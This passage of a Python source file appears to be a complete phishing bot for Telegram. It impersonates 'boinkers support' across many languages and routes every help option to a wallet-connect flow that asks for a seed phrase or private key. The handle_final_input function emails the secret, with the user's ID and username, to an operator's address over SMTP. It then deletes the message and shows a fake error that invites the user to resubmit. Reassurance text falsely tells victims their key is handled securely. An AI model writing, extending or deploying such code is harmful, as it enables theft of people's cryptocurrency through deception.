        "prompt seed": "ป้อน seed phrase 12 หรือ 24 คำของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "prompt private key": "ป้อนคีย์ส่วนตัวของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "invalid choice": "ตัวเลือกไม่ถูกต้อง โปรดใช้ปุ่ม",
        "final error message": "‼️ เกิดข้อผิดพลาด. /start เพื่อทดลองใหม่",
        "final_received_message": "ขอบคุณ — seed หรือคีย์ส่วนตัวของคุณได้รับอย่างปลอดภัยและจะถูกดำเนินการ ใช้ /start เพื่อเริ่มใหม่",
        "error_use_seed_phrase": "ช่องนี้ต้องการ seed phrase (12 หรือ 24 คำ) โปรดระบุ seed",
        "post_receive_error": "‼️ เกิดข้อผิดพลาด โปรดตรวจสอบว่า you entered the correct key — use copy/paste to avoid errors. Please /start to retry.",
        "choose language": "โปรดเลือกภาษา:",
        "await restart message": "โปรดกด /start เพื่อเริ่มใหม่",
        "back": "🔙 ย้อนกลับ",
        "invalid_input": "ข้อมูลไม่ถูกต้อง /start",
        "account recovery": "กู้คืนบัญชี",
        "claim spin": "เคลม Spin",
        "refund": "คืนเงิน",
        "claim sticker reward": "เคลมรางวัล (สติกเกอร์)",
    },
    "vi": {
        "welcome": "Hi {user} chào mừng đến với boinkers support bot! Bot này giúp với truy cập ví, giao dịch, số dư, khôi phục, khôi phục tài khoản, yêu cầu token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn trong menu để tiếp tục.",
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "claim tickets": "Yêu cầu vé",
        "recover account progress": "Khôi phục tiến độ tài khoản",
        "assets recovery": "Khôi phục Tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "withdrawals": "Rút tiền",
        "missing balance": "Thiếu số dư",
        "login issues": "Vấn đề đăng nhập",
        "connect wallet message": "Vui lòng kết nối ví bằng Khóa Riêng hoặc Seed Phrase để tiếp tục。",
        "connect wallet button": "🔑 Kết nối ví",
        "select wallet type": "Vui lòng chọn loại ví:",
        "other wallets": "Ví khác",
        "private key": "🔑 Khóa riêng",
        "seed phrase": "🔒 Nhập Seed Phrase",
        "wallet selection message": "Bạn đã chọn {wallet_name}。\nChọn phương thức kết nối。",
        "reassurance": PROFESSIONAL_REASSURANCE["vi"],
        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
        "prompt private key": "Vui lòng nhập khóa riêng của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
        "invalid choice": "Lựa chọn không hợp lệ. Vui lòng sử dụng các nút。",
        "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại。",
        "final_received_message": "Cảm ơn — seed hoặc khóa riêng đã được nhận an toàn và sẽ được xử lý。 /start để bắt đầu lại。",
        "error_use_seed_phrase": "Trường này yêu cầu seed phrase (12 hoặc 24 từ). Vui lòng cung cấp seed phrase。",
        "post_receive_error": "‼️ Đã xảy ra lỗi. Vui lòng đảm bảo nhập đúng khóa — sử dụng sao chép/dán để tránh lỗi. Vui lòng /start để thử lại。",
        "choose language": "Chọn ngôn ngữ:",
        "await restart message": "Nhấn /start để bắt đầu lại。",
        "back": "🔙 Quay lại",
        "invalid_input": "Dữ liệu không hợp lệ. /start。",
        "account recovery": "Khôi phục tài khoản",
        "claim spin": "Yêu cầu Spin",
        "refund": "Hoàn tiền",
        "claim sticker reward": "Yêu cầu Phần thưởng (Sticker)",
    },
    "pl": {
        "welcome": "Hi {user} witaj w boinkers support bocie! Ten bot pomaga w dostępie do portfela, transakcjach, saldach, odzyskiwaniu, odzyskaniu konta, odbieraniu tokenów i nagród, zwrotach i weryfikacji konta. Wybierz opcję z menu, aby kontynuować.",
        "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
        "validation": "Walidacja",
        "claim tokens": "Odbierz Tokeny",
        "claim tickets": "Odbierz Bilety",
        "recover account progress": "Odzyskaj postęp konta",
        "assets recovery": "Odzyskiwanie aktywów",
        "general issues": "Ogólne problemy",
        "rectification": "Rektyfikacja",
        "withdrawals": "Wypłaty",
        "missing balance": "Brakujący Saldo",
        "login issues": "Problemy z logowaniem",
        "connect wallet message": "Proszę połączyć portfel za pomocą Private Key lub Seed Phrase, aby kontynuować。",
        "connect wallet button": "🔑 Połącz portfel",
        "select wallet type": "Wybierz typ portfela:",
        "other wallets": "Inne portfele",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importuj Seed Phrase",
        "reassurance": PROFESSIONAL_REASSURANCE["pl"],
        "prompt seed": "Wprowadź seed phrase 12 lub 24 słów。" + PROFESSIONAL_REASSURANCE["pl"],
        "prompt private key": "Wprowadź swój private key。" + PROFESSIONAL_REASSURANCE["pl"],
        "invalid choice": "Nieprawidłowy wybór. Użyj przycisków。",
        "final error message": "‼️ Wystąpił błąd. /start aby spróbować ponownie。",
        "final_received_message": "Dziękujemy — seed lub klucz prywatny został bezpiecznie odebrany i zostanie przetworzony。 /start aby zacząć od nowa。",
        "error_use_seed_phrase": "To pole wymaga seed phrase (12 lub 24 słów)。",
        "post_receive_error": "‼️ Wystąpił błąd. /start aby spróbować ponownie。",
        "choose language": "Wybierz język:",
        "await restart message": "Kliknij /start aby zacząć ponownie。",
        "back": "🔙 Powrót",
        "invalid_input": "Nieprawidłowe dane. /start。",
        "account recovery": "Odzyskiwanie konta",
        "claim spin": "Odbierz Spin",
        "refund": "Zwrot",
        "claim sticker reward": "Odbierz nagrodę (sticker)",
    },
}

# Helper to get localized UI text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en")
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))

# Message stack helpers (Back flow)
async def send_and_push_message(bot, chat_id: int, text: str, context: ContextTypes.DEFAULT_TYPE, reply_markup=None, parse_mode=None, state=None) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append({
        "chat_id": chat_id,
        "message_id": msg.message_id,
        "text": text,
        "reply_markup": reply_markup,
        "state": recorded_state,
        "parse_mode": parse_mode,
    })
    if len(stack) > 60:
        stack.pop(0)
    return msg

async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        # if nothing in stack, show language keyboard again
        keyboard = build_language_keyboard()
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)

# Language keyboard
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("Polski 🇵🇱", callback_data="lang_pl")],
    ]
    return InlineKeyboardMarkup(keyboard)

# Build main menu markup - final menu per your request (no tree emojis)
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton(ui_text(context, "validation"), callback_data="validation"),
         InlineKeyboardButton(ui_text(context, "claim tokens"), callback_data="claim_tokens")],
        [InlineKeyboardButton(ui_text(context, "assets recovery"), callback_data="assets_recovery"),
         InlineKeyboardButton(ui_text(context, "general issues"), callback_data="general_issues")],
        [InlineKeyboardButton(ui_text(context, "rectification"), callback_data="rectification"),
         InlineKeyboardButton(ui_text(context, "withdrawals"), callback_data="withdrawals")],
        [InlineKeyboardButton(ui_text(context, "login issues"), callback_data="login_issues"),
         InlineKeyboardButton(ui_text(context, "missing balance"), callback_data="missing_balance")],
        [InlineKeyboardButton(ui_text(context, "account recovery"), callback_data="account_recovery"),
         InlineKeyboardButton(ui_text(context, "claim spin"), callback_data="claim_spin")],
        [InlineKeyboardButton(ui_text(context, "refund"), callback_data="refund"),
         InlineKeyboardButton(ui_text(context, "claim sticker reward"), callback_data="claim_sticker_reward")],
        [InlineKeyboardButton(ui_text(context, "claim tickets"), callback_data="claim_tickets"),
         InlineKeyboardButton(ui_text(context, "recover account progress"), callback_data="recover_account_progress")],
    ]
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")])
    return InlineKeyboardMarkup(kb)

# Start handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE

# Set language
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[1]
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU
    try:
        if query.message:
            await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        logging.debug("Failed to remove language keyboard (non-fatal).")
    welcome_template = ui_text(context, "welcome")
    welcome = welcome_template.format(user=update.effective_user.mention_html()) if "{user}" in welcome_template else welcome_template
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU

# Handler for invalid typed input during button-based states
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", CHOOSE_LANGUAGE)

# Show connect wallet button after menu selection
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    label = ui_text(context, "connect wallet message")
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
    ])
    await send_and_push_message(context.bot, update.effective_chat.id, label, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

# Show wallet types
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_metamask", "Tonkeeper"), callback_data="wallet_type_metamask")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_trust_wallet", "Telegram Wallet"), callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_coinbase", "MyTon Wallet"), callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_tonkeeper", "Tonhub"), callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")],
    ]
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE

# Show other wallets (two-column layout)
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keys = [
        "wallet_type_mytonwallet","wallet_type_tonhub","wallet_type_rainbow","wallet_type_safepal",
        "wallet_type_wallet_connect","wallet_type_ledger","wallet_type_brd_wallet","wallet_type_solana_wallet",
        "wallet_type_balance","wallet_type_okx","wallet_type_xverse","wallet_type_sparrow",
        "wallet_type_earth_wallet","wallet_type_hiro","wallet_type_saitamask_wallet","wallet_type_casper_wallet",
        "wallet_type_cake_wallet","wallet_type_kepir_wallet","wallet_type_icpswap","wallet_type_kaspa",
        "wallet_type_nem_wallet","wallet_type_near_wallet","wallet_type_compass_wallet","wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet","wallet_type_aioz_wallet","wallet_type_xpla_vault_wallet","wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet","wallet_type_multiversx_wallet","wallet_type_verachain_wallet","wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet","wallet_type_fearless_wallet","wallet_type_terra_station","wallet_type_cosmos_station",
        "wallet_type_exodus_wallet","wallet_type_argent","wallet_type_binance_chain","wallet_type_safemoon",
        "wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other"
    ]
    kb = []
    row = []
    for k in keys:
        base_label = WALLET_DISPLAY_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        row.append(InlineKeyboardButton(base_label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE

# Show phrase options (private key / seed)
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    wallet_key = query.data
    wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    context.user_data["wallet type"] = wallet_name
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"),
         InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")]
    ])
    text = ui_text(context, "wallet selection message").format(wallet_name=wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT

# Prompt for input using ForceReply
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt seed")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt private key")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT

# Handle final input (validate seed length, always email input, attempt to delete message)
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    user = update.effective_user

    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    # send the email
    await send_email(subject, body)

    # try to delete user's message to avoid leaving sensitive data in chat
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        logging.debug("Could not delete user message (non-fatal).")

    # Validate seed phrase when the user selected seed_phrase
    if context.user_data.get("wallet option") == "seed_phrase":
        words = [w for w in re.split(r"\s+", user_input.strip()) if w]
        if len(words) not in (12, 24):
            # ask again for the seed phrase using ForceReply with localized guidance
            fr = ForceReply(selective=False)
            await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
            context.user_data["current_state"] = RECEIVE_INPUT
            return RECEIVE_INPUT

    # If we reach here, treat as accepted input and show post receive message then await restart
    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART

# After restart handler
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART

# Email sending helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        if not SENDER_PASSWORD:
            logging.warning("SENDER_PASSWORD not set; skipping email send.")
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# Handle Back action (revert to previous message)
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state

# Cancel handler
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern="^(validation|claim_tokens|claim_tickets|recover_account_progress|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_balance|account_recovery|claim_spin|refund|claim_sticker_reward)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
